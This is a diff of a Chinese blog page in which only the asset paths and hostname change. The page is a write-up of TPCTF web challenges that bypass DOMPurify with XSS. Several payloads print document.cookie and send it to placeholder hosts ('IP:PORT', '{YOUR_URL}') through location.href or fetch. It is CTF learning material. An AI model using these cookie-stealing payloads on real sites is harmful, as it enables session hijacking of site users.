@@ -8,8 +8,8 @@
 <head>
   <meta charset="UTF-8">
 
-  <link rel="apple-touch-icon" sizes="76x76" href="/tuyi/img/tuyi.jpg">
-  <link rel="icon" href="/tuyi/img/tuyi.jpg">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/tuyi.jpg">
+  <link rel="icon" href="/img/tuyi.jpg">
   
 
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
@@ -22,7 +22,7 @@
     <meta name="description" content="前言web小白斗胆挑战国内ctf天花板，拼尽全力无法战胜 😭😭😭 但还是分享下思路吧 tips:可以使用Dom-Explorer查看 DOMPurify 输出 webbady_logoutxss怎么还要绕dompurify版本是不是太高了😁，思路错了，他采用拼接的方法，我们可以拼接xss 源码： 12345678910111213141516171819202122232425262728">
 <meta property="og:type" content="article">
 <meta property="og:title" content="TPCTF复现">
-<meta property="og:url" content="https://blog.tuyiisxp.top/2025/03/09/TPCTF%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:url" content="https://258369123.github.io/2025/03/09/TPCTF%E5%A4%8D%E7%8E%B0/index.html">
 <meta property="og:site_name" content="tuyi的小站">
 <meta property="og:description" content="前言web小白斗胆挑战国内ctf天花板，拼尽全力无法战胜 😭😭😭 但还是分享下思路吧 tips:可以使用Dom-Explorer查看 DOMPurify 输出 webbady_logoutxss怎么还要绕dompurify版本是不是太高了😁，思路错了，他采用拼接的方法，我们可以拼接xss 源码： 12345678910111213141516171819202122232425262728">
 <meta property="og:locale" content="zh_CN">
@@ -73,19 +73,19 @@
 <link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
 
 
-<link  rel="stylesheet" href="/tuyi/css/main.css" />
+<link  rel="stylesheet" href="/css/main.css" />
 
 
-  <link id="highlight-css" rel="stylesheet" href="/tuyi/css/highlight.css" />
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
   
-    <link id="highlight-css-dark" rel="stylesheet" href="/tuyi/css/highlight-dark.css" />
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
   
 
 
 
   
-<link rel="stylesheet" href="/tuyi/css/custom.css">
-<link rel="stylesheet" href="/tuyi/css/reward.css">
+<link rel="stylesheet" href="/css/custom.css">
+<link rel="stylesheet" href="/css/reward.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
 
 
@@ -93,15 +93,15 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"blog.tuyiisxp.top","root":"/tuyi/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/tuyi/local-search.xml","include_content_in_search":true};
+    var CONFIG = {"hostname":"258369123.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
       Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
     }
   </script>
-  <script  src="/tuyi/js/utils.js" ></script>
-  <script  src="/tuyi/js/color-schema.js" ></script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
   
 
 
@@ -118,7 +118,7 @@
 <div class="header-inner" style="height: 70vh;">
   <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
-    <a class="navbar-brand" href="/tuyi/">
+    <a class="navbar-brand" href="/">
       <strong>tuyi的小站</strong>
     </a>
 
@@ -137,7 +137,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/tuyi/" target="_self">
+              <a class="nav-link" href="/" target="_self">
                 <i class="iconfont icon-home-fill"></i>
                 <span>首页</span>
               </a>
@@ -149,7 +149,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/tuyi/archives/" target="_self">
+              <a class="nav-link" href="/archives/" target="_self">
                 <i class="iconfont icon-archive-fill"></i>
                 <span>归档</span>
               </a>
@@ -161,7 +161,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/tuyi/categories/" target="_self">
+              <a class="nav-link" href="/categories/" target="_self">
                 <i class="iconfont icon-category-fill"></i>
                 <span>分类</span>
               </a>
@@ -173,7 +173,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/tuyi/tags/" target="_self">
+              <a class="nav-link" href="/tags/" target="_self">
                 <i class="iconfont icon-tags-fill"></i>
                 <span>标签</span>
               </a>
@@ -185,7 +185,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/tuyi/about/" target="_self">
+              <a class="nav-link" href="/about/" target="_self">
                 <i class="iconfont icon-user-fill"></i>
                 <span>关于</span>
               </a>
@@ -215,7 +215,7 @@
   
 
 <div id="banner" class="banner" parallax=true
-     style="background: url('/tuyi/img/default.png') no-repeat center center; background-size: cover;">
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
   <div class="full-bg-img">
     <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
       <div class="banner-text text-center fade-in-up">
@@ -319,24 +319,24 @@
 <p>我们输入</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>  <br></code></pre></td></tr></table></figure>
 
-<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312112503557.png" srcset="/tuyi/img/loading.gif" lazyload alt="image-20250312112503557"></p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312112503557.png" srcset="/img/loading.gif" lazyload alt="image-20250312112503557"></p>
 <p>发现<code>onload</code>被过滤但是我们输入</p>
 <figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">onload</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure>
 
 <p>发现没有被过滤</p>
-<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312112627575.png" srcset="/tuyi/img/loading.gif" lazyload alt="image-20250312112627575"></p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312112627575.png" srcset="/img/loading.gif" lazyload alt="image-20250312112627575"></p>
 <p>那我就可以拼接构造xss</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">layout:  <span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&#123;&#123;content&#125;&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>  <br><br>content:    test&quot; onload=location.href=&quot;http://IP:PORT?flag=&quot;+document.cookie src=&quot;<br></code></pre></td></tr></table></figure>
 
 
 
-<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312112836467.png" srcset="/tuyi/img/loading.gif" lazyload alt="image-20250312112836467"></p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312112836467.png" srcset="/img/loading.gif" lazyload alt="image-20250312112836467"></p>
 <p>成功跳转</p>
 <p>第二种思路就是闭合<code>&lt;/textarea&gt;</code></p>
-<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312184144330.png" srcset="/tuyi/img/loading.gif" lazyload alt="image-20250312184144330"></p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312184144330.png" srcset="/img/loading.gif" lazyload alt="image-20250312184144330"></p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">logout</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span>&gt;</span>&#123;&#123;content&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span></span><br><br><span class="hljs-attr">content</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;&lt;/textarea&gt;</span></span></span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&lt;img src=x onerror=fetch(&#x27;&#123;YOUR_URL&#125;&#x27;+document.cookie)&gt;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312184425906.png" srcset="/tuyi/img/loading.gif" lazyload alt="image-20250312184425906"></p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312184425906.png" srcset="/img/loading.gif" lazyload alt="image-20250312184425906"></p>
 <p>也是成功解析</p>
 <h2 id="safe-layout"><a href="#safe-layout" class="headerlink" title="safe_layout"></a>safe_layout</h2><p>难度高的吓人(bushi)😁，前端的知识还是迷迷糊糊的不清楚</p>
 <p>源码：</p>
@@ -351,14 +351,14 @@
 <p><code>data-*</code> 和 <code>aria-*</code> 是 “安全的” 自定义属性，不会被过滤</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;svg data-type=<span class="hljs-string">&quot;&#123;&#123;content&#125;&#125;&quot;</span>&gt;&lt;/svg&gt;<br><br>test<span class="hljs-string">&quot; onload=location.href=&quot;</span><span class="hljs-attr">http</span>:<span class="hljs-comment">//xxx.xxx.xxx.xxx:xxxx?flag=&quot;+document.cookie src=&quot;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312120033286.png" srcset="/tuyi/img/loading.gif" lazyload alt="image-20250312120033286"></p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312120033286.png" srcset="/img/loading.gif" lazyload alt="image-20250312120033286"></p>
 <p>成功解析</p>
 <p>同样也可以用<code>&lt;/textarea&gt;</code>构造闭合</p>
 <p>由于data-* 和 aria-* 类的属性是不会被过滤的</p>
 <p>我们采用data-* 和 aria-* 类的属性</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">logout</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span>&gt;</span>&#123;&#123;content&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span></span><br><br><span class="hljs-attr">content</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">data-c</span>=<span class="hljs-string">&quot;&lt;/textarea&gt;</span></span></span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&lt;img src=x onerror=fetch(&#x27;&#123;YOUR_URL&#125;&#x27;+document.cookie)&gt;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312200534311.png" srcset="/tuyi/img/loading.gif" lazyload alt="image-20250312200534311"></p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312200534311.png" srcset="/img/loading.gif" lazyload alt="image-20250312200534311"></p>
 <p>成功解析</p>
 <h2 id="safe-layout-revenge"><a href="#safe-layout-revenge" class="headerlink" title="safe layout revenge"></a>safe layout revenge</h2><p>怎么国际赛全是xss啊</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> express <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;express&#x27;</span>;<br><span class="hljs-keyword">import</span> session <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;express-session&#x27;</span>;<br><span class="hljs-keyword">import</span> rateLimit <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;express-rate-limit&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; randomBytes &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;crypto&#x27;</span>;<br><span class="hljs-keyword">import</span> createDOMPurify <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;dompurify&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; <span class="hljs-variable constant_">JSDOM</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;jsdom&#x27;</span>;<br><br><span class="hljs-keyword">const</span> &#123; <span class="hljs-variable language_">window</span> &#125; = <span class="hljs-keyword">new</span> <span class="hljs-title function_">JSDOM</span>();<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">DOMPurify</span> = <span class="hljs-title function_">createDOMPurify</span>(<span class="hljs-variable language_">window</span>);<br><br><span class="hljs-keyword">const</span> posts = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DEFAULT_LAYOUT</span> = <span class="hljs-string">`</span><br><span class="hljs-string">&lt;article&gt;</span><br><span class="hljs-string">  &lt;h1&gt;Blog Post&lt;/h1&gt;</span><br><span class="hljs-string">  &lt;div&gt;&#123;&#123;content&#125;&#125;&lt;/div&gt;</span><br><span class="hljs-string">&lt;/article&gt;</span><br><span class="hljs-string">`</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">LENGTH_LIMIT</span> = <span class="hljs-number">500</span>;<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">&#x27;production&#x27;</span>) &#123;<br>  app.<span class="hljs-title function_">use</span>(<br>    <span class="hljs-string">&#x27;/api&#x27;</span>,<br>    <span class="hljs-title function_">rateLimit</span>(&#123;<br>      <span class="hljs-attr">windowMs</span>: <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>,<br>      <span class="hljs-attr">max</span>: <span class="hljs-number">10</span>,<br>    &#125;),<br>  );<br>&#125;<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">session</span>(&#123;<br>  <span class="hljs-attr">secret</span>: <span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">32</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>),<br>  <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,<br>  <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">false</span>,<br>&#125;));<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, _, next</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>) &#123;<br>    req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span> = [<span class="hljs-variable constant_">DEFAULT_LAYOUT</span>];<br>    req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span> = [];<br>  &#125;<br>  <span class="hljs-title function_">next</span>();<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;Cache-Control&#x27;</span>, <span class="hljs-string">&#x27;no-store&#x27;</span>);<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;home&#x27;</span>, &#123;<br>    <span class="hljs-attr">posts</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span>,<br>    <span class="hljs-attr">maxLayout</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>,<br>  &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/post&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; content, layoutId &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> content !== <span class="hljs-string">&#x27;string&#x27;</span> || <span class="hljs-keyword">typeof</span> layoutId !== <span class="hljs-string">&#x27;number&#x27;</span>) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid params&#x27;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (content.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Content too long&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> layout = req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>[layoutId];<br>  <span class="hljs-keyword">if</span> (layout === <span class="hljs-literal">undefined</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Layout not found&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> sanitizedContent = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(content, &#123;<br>    <span class="hljs-attr">ALLOWED_ATTR</span>: [],<br>    <span class="hljs-attr">ALLOW_ARIA_ATTR</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">ALLOW_DATA_ATTR</span>: <span class="hljs-literal">false</span>,<br>  &#125;);<br>  <span class="hljs-keyword">const</span> body = layout.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\&#123;\&#123;content\&#125;\&#125;/g</span>, <span class="hljs-function">() =&gt;</span> sanitizedContent);<br><br>  <span class="hljs-keyword">if</span> (body.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Post too long&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> id = <span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>  posts.<span class="hljs-title function_">set</span>(id, body);<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span>.<span class="hljs-title function_">push</span>(id);<br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Post <span class="hljs-subst">$&#123;id&#125;</span> <span class="hljs-subst">$&#123;Buffer.<span class="hljs-keyword">from</span>(layout).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)&#125;</span> <span class="hljs-subst">$&#123;Buffer.<span class="hljs-keyword">from</span>(sanitizedContent).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)&#125;</span>`</span>);<br><br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/layout&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; layout &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> layout !== <span class="hljs-string">&#x27;string&#x27;</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid param&#x27;</span>);<br>  <span class="hljs-keyword">if</span> (layout.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Layout too large&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> sanitizedLayout = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(layout, &#123;<br>    <span class="hljs-attr">ALLOWED_ATTR</span>: [],<br>    <span class="hljs-attr">ALLOW_ARIA_ATTR</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">ALLOW_DATA_ATTR</span>: <span class="hljs-literal">false</span>,<br>  &#125;);<br><br>  <span class="hljs-keyword">const</span> id = req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-property">length</span>;<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-title function_">push</span>(sanitizedLayout);<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/post/:id&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; id &#125; = req.<span class="hljs-property">params</span>;<br>  <span class="hljs-keyword">const</span> body = posts.<span class="hljs-title function_">get</span>(id);<br>  <span class="hljs-keyword">if</span> (body === <span class="hljs-literal">undefined</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Post not found&#x27;</span>);<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;post&#x27;</span>, &#123; id, body &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/clear&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span> = [<span class="hljs-variable constant_">DEFAULT_LAYOUT</span>];<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span> = [];<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;cleared&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Web server running on port 3000&#x27;</span>);<br>&#125;);<br><br></code></pre></td></tr></table></figure>
@@ -374,13 +374,13 @@
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><br>&#123; <span class="hljs-string">&quot;layout&quot;</span>: <span class="hljs-string">&quot;s&lt;style&gt;&lt;&#123;&#123;content&#125;&#125;/style&gt;&lt;&#123;&#123;content&#125;&#125;script&gt;location.href=&quot;</span><span class="hljs-attr">http</span>:<span class="hljs-comment">//xxx.xxx.xxx.xxx:xxxx?flag=&quot;+document.cookie;&lt;&#123;&#123;content&#125;&#125;/script&gt;test&lt;/style&gt;&quot; &#125;</span><br><br>&#123; <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;layoutId&quot;</span>: <span class="hljs-number">2</span> &#125;<br></code></pre></td></tr></table></figure>
 
 <p>第一个<code>&#123;&#123;content&#125;&#125;</code>用来闭合<code>style</code>标签,第二个<code>&#123;&#123;content&#125;&#125;</code>用来创建<code>script</code>标签</p>
-<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312123632707.png" srcset="/tuyi/img/loading.gif" lazyload alt="image-20250312123632707"></p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250312123632707.png" srcset="/img/loading.gif" lazyload alt="image-20250312123632707"></p>
